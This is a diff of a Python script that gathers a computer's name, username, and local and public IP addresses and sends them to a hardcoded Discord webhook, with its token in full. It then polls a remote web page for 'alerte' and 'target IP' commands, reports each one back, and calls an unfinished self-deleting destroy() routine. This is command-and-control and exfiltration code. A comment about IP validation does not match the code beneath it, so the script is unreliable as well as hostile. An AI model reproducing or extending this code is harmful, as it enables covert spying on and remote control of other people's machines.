@@ -11,10 +11,17 @@ headers = {
     "Connection": "keep-alive",
 }
 
+import os
+import sys
 
 webhook = "https://discordapp.com/api/webhooks/1445805470639067311/DdrHhMfsUhJbpH2bN8DBz_4-WblD3jlCgQtpLjS_4t5vjq6vuoURh0tGWhAIY2quGASi"
 
 valeur = ""
+ip_public = ""
+alerte_activée = ""
+ip_cible = ""
+previous_alerte = None
+previous_ip = None
 
 import platform
 import getpass
@@ -23,19 +30,18 @@ import socket
 ordi = platform.uname()
 hostname = socket.gethostname()
 
-ip = requests.get("https://api.ipify.org").text
+ip_public = requests.get("https://api.ipify.org").text
 name = (
     f"Nom de l'ordinateur : {ordi.node}\n"
     f"Utilisateur actuel : {getpass.getuser()}\n"
     f"Nom de l'ordinateur : {ordi.node}\n"
     f"Adresse IP : {socket.gethostbyname(hostname)}\n"
-    f"Adresse IP publique {ip}"
+    f"Adresse IP publique {ip_public}\n"
     )
 
 requests.post(webhook, json={"content": name})
 
 def envoyer():
-    """Récupère la valeur de l'input toutes les 20 sec."""
     global valeur
 
     try:
@@ -61,6 +67,53 @@ def loop_check():
     while True:
         envoyer()
         time.sleep(20)  # ← 20 secondes
+
+def alerte():
+    global valeur
+    global previous_alerte, alerte_activée
+
+    try:
+        response = requests.get(url, headers=headers, verify=False)
+        soup = BeautifulSoup(response.text, "html.parser")
+        champ_alerte = soup.find("input", {"id": "alerte"})
+        if champ_alerte:
+            message_alerte = champ_alerte.get("value").strip()
+            # Détecter changement et n'agir que sur changement de valeur
+            if message_alerte != "" and message_alerte != previous_alerte:
+                previous_alerte = message_alerte
+                alerte_activée = message_alerte
+                requests.post(webhook, json={"content": f"Alerte reçue : {message_alerte}"})
+                ip()
+    except Exception as e:
+        print("Erreur (alerte) :", e)
+
+    time.sleep(5)
+
+def ip():
+    global ip_public, previous_ip, ip_cible
+
+    try:
+        response = requests.get(url, headers=headers, verify=False)
+        soup = BeautifulSoup(response.text, "html.parser")
+        champ_ip = soup.find("input", {"id": "ip"})
+        if champ_ip:
+            ip_cible_nouveau = champ_ip.get("value").strip()
+            # Si nouvelle IP non vide et différente de la précédente
+            if ip_cible_nouveau != "" and ip_cible_nouveau != previous_ip:
+                previous_ip = ip_cible_nouveau
+                ip_cible = ip_cible_nouveau
+                # Validation basique du format IP
+                try:
+                    destroy()
+                    requests.post(webhook, json={"content": f"Nouvelle IP cible reçue : {ip_cible}"})
+                except ValueError:
+                    print("IP cible invalide :", ip_cible)
+    except Exception as e:
+        print("Erreur (ip) :", e)
+
+
+def destroy():
+    script_path = os.path.abspath(__file__)
 
 
 
